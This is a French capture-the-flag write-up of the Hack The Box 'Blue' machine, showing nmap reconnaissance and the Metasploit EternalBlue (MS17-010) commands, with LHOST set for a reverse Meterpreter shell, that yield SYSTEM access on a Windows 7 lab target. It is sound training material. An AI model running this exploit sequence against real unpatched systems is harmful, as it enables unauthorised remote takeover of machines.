# Blue

> **Statut** : [x] Root  
> **OS** : Windows 7 Professional SP1  
> **Difficulté** : Easy
> **HTB** : https://app.hackthebox.com/machines/Blue
> **Difficulté ressentie** : 2/10  
> **IP** : 10.129.8.99  

---

## Reconnaissance

### Nmap - scan initial

```bash
nmap -sV -sC -oA scan 10.129.8.99
```

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
```

### Nmap - scripts SMB

```
Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   Computer name: haris-PC
|   Workgroup: WORKGROUP
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.1:
|     Message signing enabled but not required
```

### Analyse

- **OS** : Windows 7 Professional SP1 - système ancien, probablement non patché
- **Surface d'attaque** : SMB (445) est le service principal exposé
- **Indices clés** :
  - Windows 7 SP1 + SMB ouvert = candidat pour MS17-010 (EternalBlue)
  - Signature SMB désactivée
  - Accès guest autorisé

---

## Exploitation

### Vecteur d'attaque

**MS17-010 - EternalBlue** : vulnérabilité critique dans le protocole SMBv1 de Windows permettant l'exécution de code à distance (RCE). Exploitée par le groupe Shadow Brokers (outil de la NSA fuité). Affecte Windows Vista/7/8/Server 2008/2012 non patchés.

CVE : CVE-2017-0144

### Exploitation avec Metasploit

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.8.99
set LHOST 10.10.14.182
set LPORT 4444
run
```

L'exploit fonctionne directement et retourne un **Meterpreter** avec les privilèges **NT AUTHORITY\SYSTEM**.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Privilege Escalation

Aucune escalade de privilèges nécessaire - l'exploit EternalBlue s'exécute au niveau kernel et donne directement les privilèges SYSTEM.

---

## Flags

```
meterpreter > cat C:\\Users\\haris\\Desktop\\user.txt
[REDACTED]

meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
[REDACTED]
```

- **User** : `[REDACTED]`
- **Root** : `[REDACTED]`

---

## Leçons apprises

- Windows 7 SP1 avec SMB ouvert est quasiment toujours vulnérable à EternalBlue (MS17-010)
- EternalBlue donne directement SYSTEM - pas besoin de privesc séparée
- Toujours vérifier la version de l'OS et le statut des patchs SMB en priorité sur les machines Windows
- Commandes Meterpreter : utiliser `\\` pour les chemins Windows (pas `\` seul)
- La présence de `sdelete.exe` et `sdelete64.exe` dans System32 indique que des outils Sysinternals ont été déployés sur la machine
